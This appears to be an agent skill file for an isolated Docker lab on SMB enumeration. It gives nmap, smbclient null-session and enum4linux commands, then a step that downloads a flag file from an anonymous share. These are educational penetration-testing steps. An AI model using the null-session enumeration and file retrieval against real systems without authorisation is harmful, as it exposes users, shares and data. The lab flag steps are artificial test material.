---
name: performing-smb-enumeration-in-lab
description: >-
  Enumerate SMB shares, users, and sessions on Windows and Linux targets using
  smbclient and enum4linux within isolated lab environments. Covers null session
  attacks, share listing, file retrieval, and user enumeration against
  misconfigured Samba and Windows SMB services.
domain: cybersecurity
subdomain: network-reconnaissance
tags: [smb, samba, enum4linux, smbclient, null-session, enumeration, network-security, beginner]
difficulty: beginner
version: "1.0.0"
author: RashpreetS01
license: Apache-2.0
mitre_techniques:
  - T1135
  - T1046
---

> **Educational Use Only** — All techniques described here must only be used in authorized, isolated lab environments. Never use against systems you do not own or have explicit written permission to test.

## When to Use

Use this skill during the enumeration phase of an authorized internal network penetration test when SMB (port 445 / 139) is detected on a target. It is particularly effective against older Windows systems or misconfigured Samba servers that allow unauthenticated (null session) access. It applies in CTF challenges where credentials, flags, or sensitive files are stored in accessible SMB shares.

## Prerequisites

- Docker and Docker Compose installed on the host machine
- Basic understanding of Windows file sharing and the SMB protocol
- Familiarity with common SMB ports: TCP 445 (SMB over TCP) and TCP 139 (NetBIOS)
- Lab: `labs/network/smb-enumeration` — start with `agentlab start smb-enumeration`

## Workflow

### Step 1: Start the Lab Environment

Launch the lab containing a Samba server (`172.50.0.20`) configured with null session access and several shares, one of which contains a flag file.

```bash
agentlab start smb-enumeration
# SMB target: 172.50.0.20 (Samba on Ubuntu)
# Attacker shell: agentlab exec smb-enumeration bash
```

### Step 2: Confirm SMB Service is Running

Verify that SMB is accessible on the target before running enumeration tools.

```bash
# Nmap service detection on SMB ports
nmap -p 139,445 -sV 172.50.0.20

# Quick netcat check
nc -zv 172.50.0.20 445
```

### Step 3: List Available Shares with smbclient

Use a null session (anonymous login) to list all shares exposed by the target.

```bash
# List shares — null session (no username/password)
smbclient -L //172.50.0.20 -N

# Alternatively with empty credentials
smbclient -L //172.50.0.20 -U ""
```

### Step 4: Run enum4linux for Comprehensive Enumeration

enum4linux automates the full range of SMB enumeration: shares, users, groups, password policies, and OS information.

```bash
# Full enumeration (-a = all checks)
enum4linux -a 172.50.0.20 | tee /tmp/smb_enum.txt

# Parse results for users and shares
grep -E "Share|user|Workgroup|OS" /tmp/smb_enum.txt
```

### Step 5: Connect to a Share and Retrieve Files

Connect to an accessible share with smbclient and download files for review.

```bash
# Connect to the 'public' share anonymously
smbclient //172.50.0.20/public -N

# Inside smbclient interactive shell:
smb: \> ls
smb: \> get flag.txt
smb: \> exit

# Or retrieve directly without interactive mode
smbclient //172.50.0.20/public -N -c "ls; get flag.txt /tmp/flag.txt"
```

### Step 6: Verify Results

Read the retrieved file and submit the flag to complete the challenge.

```bash
cat /tmp/flag.txt
agentlab verify smb-enumeration "FLAG{...}"
```

## Key Concepts

- **SMB (Server Message Block)**: A network file-sharing protocol used by Windows and Samba (Linux) to expose files, printers, and named pipes over a LAN.
- **Null Session**: An unauthenticated SMB connection established with an empty username and password — historically permitted by default on older Windows versions and misconfigured Samba servers.
- **Share Enumeration**: Querying a target SMB server to list all exposed shares, including administrative shares (C$, IPC$, ADMIN$) and custom shares.
- **IPC$ Share**: A special SMB share used for inter-process communication; null session access to IPC$ enables user and group enumeration via RPC calls.
- **enum4linux**: A Perl wrapper around Samba tools (`smbclient`, `nmblookup`, `net`) that automates the extraction of users, shares, groups, and OS details from SMB services.

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `smbclient` | Interactive SMB client for share listing and file transfer | `apt install smbclient` |
| `enum4linux` | Automated SMB/Samba enumeration wrapper | `apt install enum4linux` |
| `enum4linux-ng` | Modern Python rewrite of enum4linux with JSON output | `pip install enum4linux-ng` |
| `nmap` | Port scanning and SMB service version detection | `apt install nmap` |
| `crackmapexec` | SMB credential testing and post-auth enumeration | `pip install crackmapexec` |

## Output

On success, you should observe:
- A list of SMB shares returned by `smbclient -L` including at least one non-administrative readable share
- User accounts and workgroup/domain name extracted by `enum4linux`
- Successful file download from an accessible share via `smbclient get`
- Flag captured in the format `FLAG{...}`

---

*All labs referenced in this skill run in isolated Docker environments with `internal: true` networks. No internet access. Educational use in authorized environments only.*
